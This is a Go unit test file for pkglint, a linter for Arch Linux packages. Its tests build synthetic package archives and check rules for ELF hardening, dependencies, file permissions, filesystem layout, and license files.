package rules

import (
	"bytes"
	"debug/elf"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/jmelahman/pkglint/internal/alpmdb"
	"github.com/jmelahman/pkglint/internal/pkgfile"
	"github.com/jmelahman/pkglint/internal/pkgfile/pkgtest"
)

// TestMain pins the SPDX common-license directory to a fixture so PB834
// behaves the same on hosts with and without the `licenses` package.
func TestMain(m *testing.M) {
	dir, err := os.MkdirTemp("", "pkglint-spdx")
	if err != nil {
		panic(err)
	}
	for _, name := range []string{"MIT.txt", "GPL-3.0-or-later.txt", "Apache-2.0.txt"} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte("license text"), 0o644); err != nil {
			panic(err)
		}
	}
	spdxCommonDir = dir
	commonDir = filepath.Join(dir, "no-such-common-dir")
	code := m.Run()
	os.RemoveAll(dir)
	os.Exit(code)
}

// pkgLint builds a package archive from the members and runs the package rules.
func pkgLint(t *testing.T, db *alpmdb.DB, info string, members ...pkgtest.Member) []Finding {
	t.Helper()
	pkg, err := pkgfile.Read(bytes.NewReader(pkgtest.Tar(info, members...)), "demo-1.0-1.pkg.tar")
	if err != nil {
		t.Fatal(err)
	}
	return RunPackage(pkg, db, nil)
}

// pkgDB builds a small installed-package database:
//
//	glibc            ships usr/lib/libc.so.6
//	libpng           ships usr/lib/libpng16.so.16 and its pkgconfig file, depends on glibc
//	middle           depends on libpng (for transitive-satisfaction tests)
//	python           ships usr/bin/python3, provides python3
//	dconf, unusedpkg exist so provides/unneeded lookups resolve
func pkgDB(t *testing.T) *alpmdb.DB {
	t.Helper()
	root := t.TempDir()
	write := func(dir, desc, files string) {
		d := filepath.Join(root, dir)
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(d, "desc"), []byte(desc), 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(d, "files"), []byte(files), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("glibc-2.38-1", "%NAME%\nglibc\n\n%VERSION%\n2.38-1\n\n%PROVIDES%\nlibc.so=6-64\n",
		"%FILES%\nusr/\nusr/lib/\nusr/lib/libc.so.6\n")
	write("libpng-1.6-1", "%NAME%\nlibpng\n\n%VERSION%\n1.6-1\n\n%DEPENDS%\nglibc\n\n%PROVIDES%\nlibpng16.so=16-64\n",
		"%FILES%\nusr/\nusr/lib/\nusr/lib/libpng16.so.16\nusr/lib/pkgconfig/\nusr/lib/pkgconfig/libpng.pc\n")
	write("middle-1.0-1", "%NAME%\nmiddle\n\n%VERSION%\n1.0-1\n\n%DEPENDS%\nlibpng\n",
		"%FILES%\nusr/\nusr/share/\nusr/share/middle/\nusr/share/middle/data\n")
	write("python-3.12-1", "%NAME%\npython\n\n%VERSION%\n3.12-1\n\n%DEPENDS%\nglibc\n\n%PROVIDES%\npython3\n",
		"%FILES%\nusr/\nusr/bin/\nusr/bin/python3\n")
	write("dconf-0.40-1", "%NAME%\ndconf\n\n%VERSION%\n0.40-1\n",
		"%FILES%\nusr/\nusr/bin/\nusr/bin/dconf\n")
	write("unusedpkg-1.0-1", "%NAME%\nunusedpkg\n\n%VERSION%\n1.0-1\n",
		"%FILES%\nusr/\nusr/share/\nusr/share/unusedpkg/\nusr/share/unusedpkg/data\n")
	db, err := alpmdb.Load(root)
	if err != nil {
		t.Fatal(err)
	}
	return db
}

// hardened returns ELF options for a fully hardened object, which trips none
// of the ELF rules.
func hardened(o pkgtest.ELFOpts) pkgtest.ELFOpts {
	o.Relro = true
	o.BindNow = true
	if o.Type == elf.ET_NONE {
		o.Type = elf.ET_DYN
	}
	o.PIE = true
	return o
}

func TestCleanPackageHasNoFindings(t *testing.T) {
	lib := pkgtest.ELF(hardened(pkgtest.ELFOpts{Soname: "libdemo.so.1", Defined: []string{"demo_init"}}))
	bin := pkgtest.ELF(hardened(pkgtest.ELFOpts{
		Needed: []string{"libdemo.so.1"}, Undefined: []string{"demo_init"}, Interp: true,
	}))
	findings := pkgLint(t, pkgDB(t), pkgtest.Info("demo", "x86_64"),
		pkgtest.Member{Name: "usr/bin/demo", Data: bin, Mode: 0o755},
		pkgtest.Member{Name: "usr/lib/libdemo.so.1", Data: lib, Mode: 0o755},
	)
	if len(findings) != 0 {
		t.Fatalf("expected no findings, got %+v", findings)
	}
}

func TestPackageArchMismatch(t *testing.T) {
	bin := pkgtest.ELF(hardened(pkgtest.ELFOpts{}))
	got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/lib/demo/helper", Data: bin, Mode: 0o755}))
	if got["PB801"] != 1 {
		t.Errorf("any-arch package with ELF: got %d PB801, want 1", got["PB801"])
	}
	got = ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/lib/libdemo.a", Data: []byte("!<arch>\nx")}))
	if got["PB801"] != 1 {
		t.Errorf("any-arch package with static archive: got %d PB801, want 1", got["PB801"])
	}
	got = ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "x86_64"),
		pkgtest.Member{Name: "usr/share/demo/data", Data: []byte("plain")}))
	if got["PB801"] != 1 {
		t.Errorf("arch-specific package without binaries: got %d PB801, want 1", got["PB801"])
	}
	got = ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/share/demo/data", Data: []byte("plain")}))
	if got["PB801"] != 0 {
		t.Errorf("clean any package: got %d PB801, want 0", got["PB801"])
	}
}

func TestELFPlacement(t *testing.T) {
	bin := pkgtest.ELF(hardened(pkgtest.ELFOpts{Soname: "x"}))
	fs := pkgLint(t, nil, pkgtest.Info("demo", "x86_64"),
		pkgtest.Member{Name: "usr/share/demo/helper", Data: bin, Mode: 0o755},
		pkgtest.Member{Name: "opt/demo/vendored", Data: bin, Mode: 0o755},
		pkgtest.Member{Name: "usr/bin/fine", Data: bin, Mode: 0o755},
	)
	var errs, infos int
	for _, f := range fs {
		if f.RuleID != "PB802" {
			continue
		}
		switch f.Severity {
		case Error:
			errs++
		case Info:
			infos++
		}
	}
	if errs != 1 || infos != 1 {
		t.Errorf("got %d errors and %d infos for PB802, want 1 and 1: %+v", errs, infos, fs)
	}
}

func TestELFHardeningChecks(t *testing.T) {
	cases := []struct {
		name string
		id   string
		opts pkgtest.ELFOpts
		path string
		want int
	}{
		{"exec stack", "PB803", pkgtest.ELFOpts{ExecStack: true, Relro: true, BindNow: true, PIE: true}, "usr/bin/demo", 1},
		{"clean stack", "PB803", hardened(pkgtest.ELFOpts{}), "usr/bin/demo", 0},
		{"textrel", "PB804", pkgtest.ELFOpts{TextRel: true, Relro: true, BindNow: true, PIE: true}, "usr/bin/demo", 1},
		{"no relro", "PB805", pkgtest.ELFOpts{PIE: true}, "usr/bin/demo", 1},
		{"partial relro", "PB805", pkgtest.ELFOpts{Relro: true, PIE: true}, "usr/bin/demo", 1},
		{"full relro", "PB805", hardened(pkgtest.ELFOpts{}), "usr/bin/demo", 0},
		{"not pie", "PB806", pkgtest.ELFOpts{Type: elf.ET_EXEC, Relro: true, BindNow: true}, "usr/bin/demo", 1},
		{"pie flag", "PB806", hardened(pkgtest.ELFOpts{}), "usr/bin/demo", 0},
		{"dyn with DT_DEBUG counts as pie", "PB806", pkgtest.ELFOpts{DTDebug: true, Relro: true, BindNow: true}, "usr/bin/demo", 0},
		{"shared libraries exempt from pie", "PB806", pkgtest.ELFOpts{Relro: true, BindNow: true, Soname: "libdemo.so.1"}, "usr/lib/libdemo.so.1", 0},
		{"unstripped", "PB807", hardened(pkgtest.ELFOpts{Symtab: true}), "usr/bin/demo", 1},
		{"debug artifacts exempt", "PB807", pkgtest.ELFOpts{Symtab: true}, "usr/lib/debug/demo.debug", 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "x86_64"),
				pkgtest.Member{Name: tc.path, Data: pkgtest.ELF(tc.opts), Mode: 0o755}))
			if got[tc.id] != tc.want {
				t.Errorf("got %d %s findings, want %d (%v)", got[tc.id], tc.id, tc.want, got)
			}
		})
	}
}

func TestRpath(t *testing.T) {
	for _, tc := range []struct {
		name  string
		rpath string
		want  int
		sev   Severity
	}{
		{"build directory", "/home/builder/demo/lib", 1, Error},
		{"tmp", "/tmp/lib", 1, Error},
		{"relative", ".", 1, Error},
		{"usr local", "/usr/local/lib", 1, Warn},
		{"usr lib", "/usr/lib", 0, 0},
		{"usr lib subdir", "/usr/lib/demo", 0, 0},
		{"origin", "$ORIGIN/../lib", 0, 0},
	} {
		t.Run(tc.name, func(t *testing.T) {
			fs := pkgLint(t, nil, pkgtest.Info("demo", "x86_64"),
				pkgtest.Member{Name: "usr/bin/demo", Mode: 0o755,
					Data: pkgtest.ELF(hardened(pkgtest.ELFOpts{Rpath: tc.rpath}))})
			var got []Finding
			for _, f := range fs {
				if f.RuleID == "PB808" {
					got = append(got, f)
				}
			}
			if len(got) != tc.want {
				t.Fatalf("got %d PB808 findings, want %d: %+v", len(got), tc.want, got)
			}
			if tc.want > 0 && got[0].Severity != tc.sev {
				t.Errorf("severity %s, want %s", got[0].Severity, tc.sev)
			}
		})
	}
}

func TestMissingLibraryDependency(t *testing.T) {
	db := pkgDB(t)
	bin := func() []byte {
		return pkgtest.ELF(hardened(pkgtest.ELFOpts{Needed: []string{"libpng16.so.16"}, Undefined: []string{"png_x"}}))
	}
	find := func(deps string) []Finding {
		var fs []Finding
		for _, f := range pkgLint(t, db, pkgtest.Info("demo", "x86_64", deps),
			pkgtest.Member{Name: "usr/bin/demo", Data: bin(), Mode: 0o755}) {
			if f.RuleID == "PB809" {
				fs = append(fs, f)
			}
		}
		return fs
	}
	if fs := find("depend = libpng"); len(fs) != 0 {
		t.Errorf("direct dependency: want no findings, got %+v", fs)
	}
	if fs := find("depend = libpng16.so=16-64"); len(fs) != 0 {
		t.Errorf("soname dependency: want no findings, got %+v", fs)
	}
	if fs := find("depend = middle"); len(fs) != 1 || fs[0].Severity != Info {
		t.Errorf("transitive dependency: want one info, got %+v", fs)
	}
	if fs := find("optdepend = libpng: png export"); len(fs) != 1 || fs[0].Severity != Warn {
		t.Errorf("optional dependency: want one warn, got %+v", fs)
	}
	if fs := find("depend = glibc"); len(fs) != 1 || fs[0].Severity != Error {
		t.Errorf("missing dependency: want one error, got %+v", fs)
	}
	// A declared dependency that is not installed here makes the closure
	// unverifiable; the missing-library verdict softens to informational.
	if fs := find("depend = not-installed-here"); len(fs) != 1 || fs[0].Severity != Info {
		t.Errorf("incomplete closure: want one info, got %+v", fs)
	}
	// The package shipping the library itself needs no dependency.
	self := pkgLint(t, db, pkgtest.Info("demo", "x86_64"),
		pkgtest.Member{Name: "usr/bin/demo", Data: bin(), Mode: 0o755},
		pkgtest.Member{Name: "usr/lib/libpng16.so.16", Mode: 0o755,
			Data: pkgtest.ELF(hardened(pkgtest.ELFOpts{Soname: "libpng16.so.16", Defined: []string{"png_x"}}))})
	if got := ruleIDs(self)["PB809"]; got != 0 {
		t.Errorf("self-shipped library: want no PB809, got %d", got)
	}
	// Unknown soname: cannot be verified.
	orphan := pkgLint(t, db, pkgtest.Info("demo", "x86_64"),
		pkgtest.Member{Name: "usr/bin/demo", Mode: 0o755,
			Data: pkgtest.ELF(hardened(pkgtest.ELFOpts{Needed: []string{"libzz-nowhere.so.5"}, Undefined: []string{"x"}}))})
	if got := ruleIDs(orphan)["PB809"]; got != 1 {
		t.Errorf("orphan soname: want 1 PB809, got %d", got)
	}
	// Without a database the rule stays silent.
	if got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "x86_64"),
		pkgtest.Member{Name: "usr/bin/demo", Data: bin(), Mode: 0o755}))["PB809"]; got != 0 {
		t.Errorf("nil DB: want no PB809, got %d", got)
	}
}

func TestUnusedLinkedLibrary(t *testing.T) {
	lib := pkgtest.ELF(hardened(pkgtest.ELFOpts{Soname: "libdemo.so.1", Defined: []string{"demo_init", "demo_free"}}))
	used := pkgtest.ELF(hardened(pkgtest.ELFOpts{Needed: []string{"libdemo.so.1"}, Undefined: []string{"demo_init"}}))
	unused := pkgtest.ELF(hardened(pkgtest.ELFOpts{Needed: []string{"libdemo.so.1"}, Undefined: []string{"somethingelse"}}))
	if got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "x86_64"),
		pkgtest.Member{Name: "usr/bin/demo", Data: used, Mode: 0o755},
		pkgtest.Member{Name: "usr/lib/libdemo.so.1", Data: lib, Mode: 0o755}))["PB810"]; got != 0 {
		t.Errorf("used library: want no PB810, got %d", got)
	}
	if got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "x86_64"),
		pkgtest.Member{Name: "usr/bin/demo", Data: unused, Mode: 0o755},
		pkgtest.Member{Name: "usr/lib/libdemo.so.1", Data: lib, Mode: 0o755}))["PB810"]; got != 1 {
		t.Errorf("unused library: want 1 PB810, got %d", got)
	}
	// A library that cannot be resolved yields no verdict.
	if got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "x86_64"),
		pkgtest.Member{Name: "usr/bin/demo", Mode: 0o755,
			Data: pkgtest.ELF(hardened(pkgtest.ELFOpts{Needed: []string{"libzz-nowhere.so.5"}, Undefined: []string{"x"}}))}))["PB810"]; got != 0 {
		t.Errorf("unresolvable library: want no PB810, got %d", got)
	}
}

func TestSonameDeclarations(t *testing.T) {
	bin := pkgtest.ELF(hardened(pkgtest.ELFOpts{Needed: []string{"libpng16.so.16"}, Undefined: []string{"x"}}))
	lib := pkgtest.ELF(hardened(pkgtest.ELFOpts{Soname: "libdemo.so.1", Defined: []string{"y"}}))
	fs := pkgLint(t, nil, pkgtest.Info("demo", "x86_64",
		"depend = libpng16.so=16-64", // linked: fine
		"depend = libxml2.so=2-64",   // linked by nothing
		"depend = libfoo.so",         // unversioned
		"provides = libdemo.so=1-64", // shipped: fine
		"provides = libgone.so=3-64", // not shipped
		"provides = libbar.so",       // unversioned and not shipped
	),
		pkgtest.Member{Name: "usr/bin/demo", Data: bin, Mode: 0o755},
		pkgtest.Member{Name: "usr/lib/libdemo.so.1", Data: lib, Mode: 0o755},
	)
	var errs, warns int
	for _, f := range fs {
		if f.RuleID != "PB811" {
			continue
		}
		switch f.Severity {
		case Error:
			errs++
		case Warn:
			warns++
		}
	}
	// Errors: libfoo.so, libbar.so (unversioned). Warns: libxml2.so (not
	// linked), libgone.so and libbar.so (not shipped), libfoo.so (not linked).
	if errs != 2 || warns != 4 {
		t.Errorf("got %d errors and %d warns for PB811, want 2 and 4: %+v", errs, warns, fs)
	}
}

func TestShebangDeps(t *testing.T) {
	db := pkgDB(t)
	script := pkgtest.Member{Name: "usr/bin/tool", Data: []byte("#!/usr/bin/python3\nprint()\n"), Mode: 0o755}
	if got := ruleIDs(pkgLint(t, db, pkgtest.Info("demo", "any"), script))["PB812"]; got != 1 {
		t.Errorf("missing interpreter dep: want 1 PB812, got %d", got)
	}
	if got := ruleIDs(pkgLint(t, db, pkgtest.Info("demo", "any", "depend = python"), script))["PB812"]; got != 0 {
		t.Errorf("declared interpreter dep: want no PB812, got %d", got)
	}
	// The provides name works too.
	if got := ruleIDs(pkgLint(t, db, pkgtest.Info("demo", "any", "depend = python3"), script))["PB812"]; got != 0 {
		t.Errorf("provides-satisfied interpreter: want no PB812, got %d", got)
	}
	// Unresolvable interpreters are informational.
	odd := pkgtest.Member{Name: "usr/bin/o", Data: []byte("#!/usr/bin/oddball\n"), Mode: 0o755}
	fs := pkgLint(t, db, pkgtest.Info("demo", "any"), odd)
	found := false
	for _, f := range fs {
		if f.RuleID == "PB812" && f.Severity == Info {
			found = true
		}
	}
	if !found {
		t.Errorf("unresolvable interpreter: want an info PB812, got %+v", fs)
	}
	// sh and bash are never reported.
	shScript := pkgtest.Member{Name: "usr/bin/s", Data: []byte("#!/bin/sh\n"), Mode: 0o755}
	if got := ruleIDs(pkgLint(t, db, pkgtest.Info("demo", "any"), shScript))["PB812"]; got != 0 {
		t.Errorf("sh script: want no PB812, got %d", got)
	}
}

func TestUnneededDependency(t *testing.T) {
	db := pkgDB(t)
	bin := pkgtest.ELF(hardened(pkgtest.ELFOpts{Needed: []string{"libpng16.so.16"}, Undefined: []string{"x"}}))
	fs := pkgLint(t, db, pkgtest.Info("demo", "x86_64", "depend = libpng", "depend = unusedpkg"),
		pkgtest.Member{Name: "usr/bin/demo", Data: bin, Mode: 0o755})
	var hits []string
	for _, f := range fs {
		if f.RuleID == "PB813" {
			hits = append(hits, f.Message)
		}
	}
	if len(hits) != 1 || !strings.Contains(hits[0], "unusedpkg") {
		t.Errorf("want exactly one PB813 naming unusedpkg, got %v", hits)
	}
	// Pure data packages produce no evidence and no findings.
	data := pkgLint(t, db, pkgtest.Info("demo", "any", "depend = unusedpkg"),
		pkgtest.Member{Name: "usr/share/demo/data", Data: []byte("x")})
	if got := ruleIDs(data)["PB813"]; got != 0 {
		t.Errorf("data package: want no PB813, got %d", got)
	}
}

func TestPathDeps(t *testing.T) {
	db := pkgDB(t)
	schema := pkgtest.Member{Name: "usr/share/glib-2.0/schemas", Type: '5', Mode: 0o755}
	if got := ruleIDs(pkgLint(t, db, pkgtest.Info("demo", "any"), schema))["PB814"]; got != 1 {
		t.Errorf("schemas without dconf: want 1 PB814, got %d", got)
	}
	if got := ruleIDs(pkgLint(t, db, pkgtest.Info("demo", "any", "depend = dconf"), schema))["PB814"]; got != 0 {
		t.Errorf("schemas with dconf: want no PB814, got %d", got)
	}
	jar := pkgtest.Member{Name: "usr/share/java/demo.jar", Data: []byte("PK")}
	if got := ruleIDs(pkgLint(t, db, pkgtest.Info("demo", "any"), jar))["PB814"]; got != 1 {
		t.Errorf("jar without java-runtime: want 1 PB814, got %d", got)
	}
}

func TestHookCoveredDeps(t *testing.T) {
	desktop := pkgtest.Member{Name: "usr/share/applications/demo.desktop", Data: []byte("[Desktop Entry]")}
	if got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any", "depend = desktop-file-utils"), desktop))["PB815"]; got != 1 {
		t.Errorf("want 1 PB815, got %d", got)
	}
	if got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"), desktop))["PB815"]; got != 0 {
		t.Errorf("no dependency: want no PB815, got %d", got)
	}
}

func TestPkgconfigDeps(t *testing.T) {
	db := pkgDB(t)
	pc := pkgtest.Member{Name: "usr/lib/pkgconfig/demo.pc",
		Data: []byte("Name: demo\nRequires: libpng >= 1.6\nLibs: -ldemo\n")}
	if got := ruleIDs(pkgLint(t, db, pkgtest.Info("demo", "x86_64"), pc))["PB816"]; got != 1 {
		t.Errorf("missing pc dependency: want 1 PB816, got %d", got)
	}
	if got := ruleIDs(pkgLint(t, db, pkgtest.Info("demo", "x86_64", "depend = libpng"), pc))["PB816"]; got != 0 {
		t.Errorf("declared pc dependency: want no PB816, got %d", got)
	}
	// Requiring a module the package ships itself is fine.
	self := pkgtest.Member{Name: "usr/lib/pkgconfig/demo-core.pc", Data: []byte("Name: core\n")}
	pcSelf := pkgtest.Member{Name: "usr/lib/pkgconfig/demo.pc", Data: []byte("Requires: demo-core\n")}
	if got := ruleIDs(pkgLint(t, db, pkgtest.Info("demo", "x86_64"), self, pcSelf))["PB816"]; got != 0 {
		t.Errorf("self-shipped module: want no PB816, got %d", got)
	}
}

func TestPackageMetadata(t *testing.T) {
	info := "pkgname = Demo\npkgver = 1.0-1\narch = any\nsize = 10\nlicense = MIT\n"
	got := ruleIDs(pkgLint(t, nil, info))
	if got["PB817"] != 3 { // no url, no desc, uppercase name
		t.Errorf("want 3 PB817 findings, got %d", got["PB817"])
	}
	if got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any")))["PB817"]; got != 0 {
		t.Errorf("complete metadata: want no PB817, got %d", got)
	}
}

func TestFilesystemLayout(t *testing.T) {
	fs := pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "tmp/demo.state", Data: []byte("x")},
		pkgtest.Member{Name: "usr/local/bin/demo", Data: []byte("x")},
		pkgtest.Member{Name: "usr/man/man1/demo.1", Data: []byte("x")},
		pkgtest.Member{Name: "opt/demo/man/demo.1", Data: []byte("x")},
		pkgtest.Member{Name: "usr/share/demo/man/demo.1", Data: []byte("x")}, // exempt tree
		pkgtest.Member{Name: "usr/share/man/man1/demo.1.gz", Data: []byte("x")},
		pkgtest.Member{Name: "etc/demo.conf", Data: []byte("x")},
	)
	var errs, warns, infos int
	for _, f := range fs {
		if f.RuleID != "PB820" {
			continue
		}
		switch f.Severity {
		case Error:
			errs++
		case Warn:
			warns++
		case Info:
			infos++
		}
	}
	// tmp/demo.state error; usr/man error; usr/local warn; man-component info.
	if errs != 2 || warns != 1 || infos != 1 {
		t.Errorf("got %d/%d/%d error/warn/info PB820, want 2/1/1: %+v", errs, warns, infos, fs)
	}
}

func TestFilePermissions(t *testing.T) {
	fs := pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/bin/fine", Data: []byte("x"), Mode: 0o755},            // fine
		pkgtest.Member{Name: "usr/bin/evil", Data: []byte("x"), Mode: 0o777},            // world-writable
		pkgtest.Member{Name: "usr/bin/suid", Data: []byte("x"), Mode: 0o4755},           // setuid
		pkgtest.Member{Name: "usr/share/secret", Data: []byte("x"), Mode: 0o640},        // not world-readable
		pkgtest.Member{Name: "usr/lib/libdemo.a", Data: []byte("!<arch>"), Mode: 0o755}, // wrong static-lib mode
	)
	var errs, warns int
	for _, f := range fs {
		if f.RuleID != "PB821" {
			continue
		}
		if f.Severity == Error {
			errs++
		} else {
			warns++
		}
	}
	if errs != 1 || warns != 3 {
		t.Errorf("got %d errors / %d warns for PB821, want 1/3: %+v", errs, warns, fs)
	}
}

func TestFileOwnership(t *testing.T) {
	got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/share/demo/mine", Data: []byte("x"), Uname: "builder", Gname: "users", UID: 1000, GID: 1000}))
	if got["PB822"] != 1 {
		t.Errorf("want 1 PB822, got %d", got["PB822"])
	}

	// Numeric-only ownership (no names in the tar header) reports the IDs.
	fs := pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/share/demo/mine", Data: []byte("x"), UID: 1000, GID: 1000})
	found := false
	for _, f := range fs {
		if f.RuleID == "PB822" {
			found = true
			if !strings.Contains(f.Message, "1000:1000") {
				t.Errorf("PB822 message %q, want the numeric owner 1000:1000", f.Message)
			}
		}
	}
	if !found {
		t.Error("want a PB822 finding for numeric-only ownership")
	}
}

func TestItoa(t *testing.T) {
	for _, tc := range []struct {
		n    int
		want string
	}{{0, "0"}, {7, "7"}, {1000, "1000"}, {-42, "-42"}} {
		if got := itoa(tc.n); got != tc.want {
			t.Errorf("itoa(%d) = %q, want %q", tc.n, got, tc.want)
		}
	}
}

func TestEmptyDirectories(t *testing.T) {
	got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/", Type: '5'},
		pkgtest.Member{Name: "usr/share/", Type: '5'},
		pkgtest.Member{Name: "usr/share/demo/", Type: '5'},
		pkgtest.Member{Name: "var/", Type: '5'},
		pkgtest.Member{Name: "var/lib/", Type: '5'},
		pkgtest.Member{Name: "var/lib/demo/", Type: '5'},
		pkgtest.Member{Name: "usr/share/demo/data", Data: []byte("x")}))
	if got["PB823"] != 1 { // var/lib/demo only
		t.Errorf("want 1 PB823, got %d", got["PB823"])
	}
}

func TestFilenames(t *testing.T) {
	got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/share/demo/café.txt", Data: []byte("x")},
		pkgtest.Member{Name: "usr/share/demo/plain.txt", Data: []byte("x")}))
	if got["PB824"] != 1 {
		t.Errorf("want 1 PB824, got %d", got["PB824"])
	}
}

func TestHardlinksAndSymlinks(t *testing.T) {
	db := pkgDB(t)
	fs := pkgLint(t, db, pkgtest.Info("demo", "any", "depend = libpng"),
		pkgtest.Member{Name: "usr/bin/demo", Data: []byte("#!/bin/sh\n"), Mode: 0o755},
		pkgtest.Member{Name: "usr/lib/demo/demo", Type: '1', Link: "usr/bin/demo"},        // cross-dir hardlink
		pkgtest.Member{Name: "usr/bin/demo2", Type: '2', Link: "demo"},                    // relative, in package
		pkgtest.Member{Name: "usr/bin/demo3", Type: '2', Link: "/usr/lib/libpng16.so.16"}, // in dependency
		pkgtest.Member{Name: "usr/bin/broken", Type: '2', Link: "/usr/share/demo/gone"},   // dangling
	)
	got := ruleIDs(fs)
	if got["PB825"] != 1 {
		t.Errorf("want 1 PB825, got %d: %+v", got["PB825"], fs)
	}
	if got["PB826"] != 1 {
		t.Errorf("want 1 PB826, got %d: %+v", got["PB826"], fs)
	}
}

func TestSingleFileLandmines(t *testing.T) {
	got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/lib/libdemo.la", Data: []byte("# libtool")},
		pkgtest.Member{Name: "usr/lib/perl5/perllocal.pod", Data: []byte("x")},
		pkgtest.Member{Name: "usr/share/info/dir", Data: []byte("x")},
		pkgtest.Member{Name: "usr/lib/python3.12/site-packages/tests", Type: '5'},
		pkgtest.Member{Name: "usr/share/doc/demo/.doctrees/environment.pickle", Data: []byte("x")},
		pkgtest.Member{Name: "usr/share/applications/mimeinfo.cache", Data: []byte("x")},
		pkgtest.Member{Name: "var/lib/scrollkeeper/", Type: '5'}))
	for id, want := range map[string]int{
		"PB827": 1, "PB828": 1, "PB829": 1, "PB831": 1, "PB837": 1, "PB838": 1, "PB839": 1,
	} {
		if got[id] != want {
			t.Errorf("got %d %s findings, want %d", got[id], id, want)
		}
	}
}

func TestPycMtimes(t *testing.T) {
	py := "usr/lib/python3.12/site-packages/demo/mod.py"
	pyc := "usr/lib/python3.12/site-packages/demo/__pycache__/mod.cpython-312.pyc"
	early := time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC)
	late := time.Date(2024, 6, 1, 0, 0, 0, 0, time.UTC)

	stale := pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: py, Data: []byte("x"), ModTime: late},
		pkgtest.Member{Name: pyc, Data: []byte("x"), ModTime: early})
	var sev []Severity
	for _, f := range stale {
		if f.RuleID == "PB830" {
			sev = append(sev, f.Severity)
		}
	}
	if len(sev) != 1 || sev[0] != Error {
		t.Errorf("tar-stale bytecode: want one error, got %+v", stale)
	}

	fresh := pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: py, Data: []byte("x"), ModTime: early},
		pkgtest.Member{Name: pyc, Data: []byte("x"), ModTime: late})
	if got := ruleIDs(fresh)["PB830"]; got != 0 {
		t.Errorf("fresh bytecode: want no PB830, got %d", got)
	}

	// Consistent tar timestamps but a stale .MTREE: warn.
	mtree := "#mtree\n./" + py + " time=1700000200.0\n./" + pyc + " time=1700000100.0\n"
	mixed := pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: ".MTREE", Data: []byte(mtree)},
		pkgtest.Member{Name: py, Data: []byte("x"), ModTime: early},
		pkgtest.Member{Name: pyc, Data: []byte("x"), ModTime: late})
	sev = nil
	for _, f := range mixed {
		if f.RuleID == "PB830" {
			sev = append(sev, f.Severity)
		}
	}
	if len(sev) != 1 || sev[0] != Warn {
		t.Errorf("mtree-stale bytecode: want one warn, got %+v", mixed)
	}
}

func TestSystemdAndDbusLocations(t *testing.T) {
	got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "etc/systemd/system/demo.service", Data: []byte("x")},
		pkgtest.Member{Name: "etc/dbus-1/system.d/demo.conf", Data: []byte("x")}))
	if got["PB832"] != 1 || got["PB833"] != 1 {
		t.Errorf("want 1 PB832 and 1 PB833, got %v", got)
	}
	// systemd itself is exempt.
	sysd := ruleIDs(pkgLint(t, nil, pkgtest.Info("systemd", "x86_64"),
		pkgtest.Member{Name: "etc/systemd/system/x.service", Data: []byte("x")}))
	if sysd["PB832"] != 0 {
		t.Errorf("systemd package: want no PB832, got %d", sysd["PB832"])
	}
}

func TestLicenseFiles(t *testing.T) {
	bin := pkgtest.Member{Name: "usr/bin/demo", Data: []byte("#!/bin/sh\n"), Mode: 0o755}
	noLicense := "pkgname = demo\npkgver = 1.0-1\npkgdesc = x\nurl = https://example.com\narch = any\nsize = 10\n"
	if got := ruleIDs(pkgLint(t, nil, noLicense, bin))["PB834"]; got != 1 {
		t.Errorf("no license: want 1 PB834, got %d", got)
	}
	if got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"), bin))["PB834"]; got != 0 {
		t.Errorf("common license: want no PB834, got %d", got)
	}
	custom := "pkgname = demo\npkgver = 1.0-1\npkgdesc = x\nurl = https://example.com\narch = any\nlicense = LicenseRef-demo-eula\nsize = 10\n"
	if got := ruleIDs(pkgLint(t, nil, custom, bin))["PB834"]; got != 1 {
		t.Errorf("custom license without file: want 1 PB834, got %d", got)
	}
	withFile := ruleIDs(pkgLint(t, nil, custom, bin,
		pkgtest.Member{Name: "usr/share/licenses/demo/EULA", Data: []byte("terms")}))
	if withFile["PB834"] != 0 {
		t.Errorf("custom license with file: want no PB834, got %d", withFile["PB834"])
	}
	// An uncommon-but-known SPDX identifier needs a file too (not in the
	// fixture's common dir).
	uncommon := "pkgname = demo\npkgver = 1.0-1\npkgdesc = x\nurl = https://example.com\narch = any\nlicense = EUPL-1.2\nsize = 10\n"
	if got := ruleIDs(pkgLint(t, nil, uncommon, bin))["PB834"]; got != 1 {
		t.Errorf("uncommon SPDX license without file: want 1 PB834, got %d", got)
	}
}

